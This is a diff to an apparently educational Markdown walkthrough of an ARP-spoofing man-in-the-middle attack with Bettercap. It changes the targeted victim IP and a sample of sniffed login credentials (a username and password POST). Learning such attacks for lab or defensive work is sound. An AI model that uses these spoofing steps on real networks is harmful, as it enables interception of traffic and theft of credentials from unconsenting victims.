@@ -58,7 +58,7 @@ Install **Bettercap** if not already installed:
 
 3. **Set Victim IP:**
     ```bash
-    set arp.spoof.targets 192.168.94.171
+    set arp.spoof.targets 192.168.1.10
     ```
 
 4. **Launch Attack:**
@@ -75,7 +75,7 @@ Install **Bettercap** if not already installed:
 
 6. **Captured Output:**
     ```
-    POST /userinfo.php uname=loc&pass=mor
+    POST /userinfo.php uname=Alok&pass=1234
     ```
 ---
 
